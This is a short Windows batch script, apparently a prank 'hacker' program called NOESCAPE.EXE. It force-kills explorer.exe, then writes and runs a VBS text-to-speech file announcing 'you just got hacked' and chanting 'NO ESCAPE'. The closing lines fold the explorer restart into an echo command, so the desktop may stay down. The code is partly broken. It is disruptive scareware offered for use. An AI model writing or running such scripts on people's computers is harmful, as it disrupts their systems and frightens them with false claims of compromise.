@echo off
color a
taskkill /f /im "explorer.exe"
:1
echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
set "text=Hello, you just got hacked by NOESCAPE.EXE, hit any key to proceed"
echo speech.speak "%text%" >> "speech.vbs"
start speech.vbs
:2
echo Hello, you just got hacked by NOESCAPE.EXE echo Hit any key to proceed
pause
:3
del speech.Vbs
echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
set "text=NO ESCAPE, NO ESCAPE, NO ESCAPE,"
echo speech.speak "%text%" >> "speech.vbs"
start speech.vbs
:4
echo NO ESCAPE, NO ESCAPE, NO ESCAPE,start explorer.exe
end

